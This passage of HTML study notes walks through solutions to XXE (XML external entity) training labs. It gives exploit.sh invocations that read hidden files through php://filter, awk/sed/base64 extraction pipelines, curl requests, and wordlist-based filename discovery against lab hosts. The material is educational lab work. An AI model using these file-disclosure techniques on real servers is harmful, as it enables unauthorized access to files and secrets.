+&gt;&lt;username&gt;l33t&amp;password=l33t
+
+The leet login will be:
+
+username: l33t
+password: l33t
+</code></pre><h2 id="9fe884d3-bdf0-45eb-8b32-4d75698f237b" class=""><strong>Lab 2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#lab-2"></a></strong></h2><p id="ee052d9a-2148-47e3-a06a-0bae6fb1a8a5" class="">Below, you can find solutions for each task. Remember, though, that you can follow your own strategy, which may be different from the one explained in the following lab.</p><blockquote id="f6a56150-d695-4f60-bc5b-5266ef83415f" class="">NOTE: The techniques to use during this lab are better explained in the study material. You should refer to it for further details. These solutions are provided here only to verify the correctness.</blockquote><h3 id="8376a01b-011c-4bbb-9164-b9c66247149d" class=""><strong>Solutions - Lab #1</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-1-1"></a></strong></h3><p id="c9738cdf-2f4e-41ca-869f-e42c2a67ffc8" class="">Basic XXE exploitation: requires a file for the solution:</p><p id="45be07f7-90e9-4542-9d8b-7b718278f498" class=""><em>Simple warm-up</em> Exploitation steps:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="306d98de-ef1a-41a7-8bfd-0662d5407dad" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Download the content of .letmepass (exploit.sh can be found at http://1.xxe.labs/solution/exploit.sh)
+
+./exploit.sh {DOCROOT}/.letmepass
+</code></pre><p id="5d06e83f-c460-4abd-a2b5-ae7db486fec1" class="">Extract the content from the result:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9723e965-80a2-4879-afff-9de5912a95c6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[Step 1] | awk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }&#x27;
+
+OR
+
+[Step 1] | gawk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }&#x27;
+</code></pre><p id="7d8bda50-4c22-4ddf-a4be-2206f7a3e9ee" class="">Remove JSON escaping characters:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e69ed687-8e99-467f-99f5-b2658b090d14" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[Steps 1|2] | sed &#x27;s/\\\//\//g&#x27;
+</code></pre><p id="a08240c7-2b65-4429-9b73-b84d43be884f" class="">Testing command:</p><p id="f77e3c3c-57b8-44b0-a093-de0855892af5" class="">Note: this is GNU-based awk command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="36b1cd16-69e0-4627-a26d-39ee2df7f79e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit.sh /var/www/1/.letmepass \
+| awk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }&#x27; \
+| sed &#x27;s/\\\//\//g&#x27;
+</code></pre><h3 id="5f864947-8c25-4517-b574-5eb87161c0fc" class=""><strong>Solutions - Lab #2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-2-1"></a></strong></h3><p id="a7a8e119-27ae-43b0-ab9e-3f1d3aef2a5c" class="">Basic XXE exploitation and basic curl with base64 encoded solution:</p><p id="9ba4420c-6bdd-4015-a757-12b50e271ef7" class=""><em>Simple (encoded) warm-up</em></p><p id="2f5ccdd7-d6bf-4761-935b-c15029d6bba3" class="">Valid passphrase</p><p id="433528b6-28df-48fa-9d69-472c8440c430" class="">The hidden username is theOhpe that base64-encoded is: <strong>dGhlT2hwZQ==</strong>.</p><p id="3a3493ba-9cfd-4298-96c5-9c01edeb6867" class="">To retrieve the value, it is required to perform a DELETE request to the whois.php script. Exploitation steps</p><p id="63b1b3ec-de3e-4d6f-b593-cca846a82bef" class="">Download the content of .letmepass:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2074fdd8-edb7-4d67-a6fb-8fb912dd4ab8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit.sh {DOCROOT}/.letmepass
+</code></pre><p id="1c975a6c-10f1-4362-af59-705e4d9aa805" class="">Extract the content from the result:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3f95190b-7fba-4e5a-b42b-31297c918471" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[Step 1] | gawk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }&#x27;
+</code></pre><p id="830b655f-7b24-4855-81b3-7862535a76a5" class="">Remove JSON escaping characters:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bb881f18-a552-4b1a-a50d-49f3ee37967c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[Steps 1|2] | sed &#x27;s/\\\//\//g&#x27;
+</code></pre><p id="024b3770-a013-4899-9f4d-4f5634d2d147" class="">Retrieve the content of whois.php using the DELETE verb:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a5487e17-a174-47e7-b8bf-7ced74c7d8ce" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">curl -s &quot;http://2.xxe.labs/whois.php&quot; -X DELETE
+</code></pre><ul id="dda7bde6-fd46-4825-9cf6-bd38c8e713a1" class="bulleted-list"><li style="list-style-type:disc">Base64 decode and store the result in a file.</li></ul><blockquote id="87a30174-6ab1-448c-86eb-6cc4f6311b17" class="">The base64 command has different implementations; therefore, you may need one of these two switches to decode:</blockquote><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="95dd2733-2b84-4e0c-934f-6ba04f1b8884" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[Steps 1|2|3] | base64 -d
+
+OR
+
+[Steps 1|2|3] | base64 -D
+</code></pre><p id="64c122ee-ae23-4038-b70e-b4936b6a48f7" class="">Testing command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="39c4f548-93fa-4c87-9618-a96cb9f2fc3f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit.sh php://filter/convert.base64-encode/resource=/var/www/xxe/2/.letmepass \
+| awk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }&#x27; \
+| sed &#x27;s/\\\//\//g&#x27;
+
+curl -s &#x27;http://2.xxe.labs/whois.php&#x27; -X DELETE | base64 -d
+</code></pre><h3 id="db819192-9418-4fae-ad03-348b0eb0b276" class=""><strong>Solutions - Lab #3</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-3-1"></a></strong></h3><p id="b65b8523-e7bd-4fe0-b14f-b57c0d3fb455" class=""><em>The solution is encoded and obfuscated in a php file</em></p><p id="bc87fdd2-214a-4ccc-ad61-4a8240540ab9" class="">Dont break my XML:</p><p id="1ae0638b-4761-406d-b97b-c8ba25105a74" class="">Exploitation steps</p><p id="4f7c908e-896f-43a0-bcbb-d9e3d6480241" class="">Download base64 encoded the content of .letmepass:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0d7219b2-9f8a-4bd5-ab36-1124290ff8ab" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit.sh php://filter/convert.base64-encode/resource=/var/www/3/.letmepass.php
+</code></pre><p id="a6f3ff28-ac62-48cb-8928-8dc37f0f4e1c" class="">Extract the content from the result:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4441dc51-a12c-427b-8911-1eabbeae2c97" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[Step 1] | gawk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }&#x27;
+</code></pre><p id="b6844803-b207-4d69-a437-d159bf2fbad2" class="">Remove JSON escaping characters:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c913b6e1-fcf9-4d77-80e7-21882c70bc1f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[Steps 1|2] | sed &#x27;s/\\\//\//g&#x27;
+</code></pre><p id="c102233a-d055-4859-b714-d79fdcea0bc0" class="">Base64 decode and store result within a file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b20b0e25-a719-4f72-b8e3-85d830634a60" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[Steps 1|2|3] | base64 -d &gt; whaat.php
+
+OR
+
+[Steps 1|2|3] | base64 -D &gt; whaat.php
+</code></pre><p id="eecde04a-b8ab-4106-8f57-55d7214554be" class="">De-obfuscate the $config variable and execute the php script:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c2951d33-eef2-4a13-aefd-fcae88e6416e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">echo &#x27;var_dump($config);&#x27; &gt;&gt; whaat.php | php whaat.php
+</code></pre><p id="63f34967-0f45-493b-8c2c-19f8647a3386" class="">Testing command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cf4faf1c-9457-4ac7-89e1-bd7ee7211f27" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit.sh php://filter/convert.base64-encode/resource=/var/www /3/.letmepass \
+| awk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }&#x27; \
+| sed &#x27;s/\\\//\//g&#x27; \
+| base64 -d &gt; whaat.php
+
+echo &#x27;var_dump($config);&#x27; &gt;&gt; whaat.php | php whaat.php
+</code></pre><h3 id="65507479-2753-48e2-82e5-8262b5f5de67" class=""><strong>Solutions - Lab #4</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-4"></a></strong></h3><p id="a3de2d33-6a96-4882-9321-3bdba14c1c2b" class="">A png file contains the solution:</p><p id="625ec2ba-a7e1-4913-a53f-b96b9d4c60a5" class=""><em>Do you like ASCII? I do!</em> Exploitation steps</p><p id="9dd9053b-9017-4ff5-a0ee-a65f1ddeb02b" class="">Download the base64 encoded the content of .letmepass:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="91c1872a-d1d5-4c7e-82bf-a75bfc55be05" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit.sh php://filter/convert.base64-encode/resource=/var/www/4/.letmepass.php
+</code></pre><p id="6d1bca40-825a-4eab-aeee-502b795cf3ab" class="">Extract the content from the result:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4e1cb679-e6e8-4e85-80ca-8e97469d4387" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[Step 1] | gawk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }&#x27;
+</code></pre><p id="b3bca91d-701c-423c-a93e-d3f3d2f9ad73" class="">Remove the JSON escaping characters:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a426cc1f-c395-4774-bfdc-248678a21ff7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[Steps 1|2] | sed &#x27;s/\\\//\//g&#x27;
+</code></pre><p id="3120e034-4c1f-45f9-a72f-e074c450b247" class="">Base64 decode and store result within a file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="68f873f8-74c3-422a-b66f-afd694d90f4c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[Steps 1|2|3] | base64 -d &gt; wohoo.png
+
+OR
+
+[Steps 1|2|3] | base64 -D &gt; wohoo.png
+</code></pre><ul id="f5fbf928-5df3-424f-8fb9-853cd634b455" class="bulleted-list"><li style="list-style-type:disc">Open the file</li></ul><p id="c115aff2-67f3-4a01-85ad-f64963e67935" class="">Testing command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1c681a0b-1910-45be-a6c2-787730e84640" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit.sh php://filter/convert.base64-encode/resource=/var/www/4/.letmepass \
+| awk &#x27;match($0, /&lt;b&gt;XXEME (.*)&lt;\\\/b&gt;/, m) { print m[1] }&#x27; \
+| sed &#x27;s/\\\//\//g&#x27; \
+| base64 -d &gt; wohoo.png
+
+open wohoo.png
+</code></pre><h3 id="17609ccb-81e3-44fb-8ef2-cca12bd5cb3a" class=""><strong>Solutions - Lab #5</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#solutions---lab-5"></a></strong></h3><p id="bed01a6d-54cf-449f-a157-63de7eb1cff4" class="">In a folder full of files, there is a special one…:</p><p id="69b54322-1151-4525-b1ba-34e5088361b4" class=""><em>Wheres the hidden file?</em></p><p id="215e5c8b-7b33-41fd-a992-1d5b46d0fea4" class="">Exploitation steps</p><p id="b106e36f-6d10-4d9b-9124-ba9510b33519" class="">The solution within basexml.php.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0edb4e84-fd2f-44ee-8b6e-e120ca1c4bf3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Part 1
+
+- Download the base64 encoded the content of .letmepass.
+- Extract the content from the result.
+- Remove the JSON escaping characters.
+- Base64 decode and store result within a file.
+</code></pre><p id="1b8152b0-8ba9-4d01-8e35-1f02fc6bb4e3" class="">Part 2</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="29221050-4261-473f-99ee-a35bafd47f6f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Download a list of common PHP file names; this is a good resource: Filenames_PHP_Common.wordlist @ (http://blog.thireus.com/web-common-directories-and-filenames-word-lists-collection)
+- Automate the retrieving process:
+- Similar to Part 1
+- Parse result and show the good file that contains the tag .
+</code></pre><p id="2cdfb972-2fd5-4d2c-b9a0-fb10b7bfb7c8" class="">Testing command:</p><p id="f8b43f03-f7a5-49b8-b431-7b80777d668a" class="">Part 1</p><p id="ba0c9337-2c3f-457f-a1c8-19c11f7d18fa" class="">Extract instructions from .letmepass:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26b724be-32e2-4e0b-8930-c87de0a67bc9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">./exploit.sh /var/www/5/.letmepass
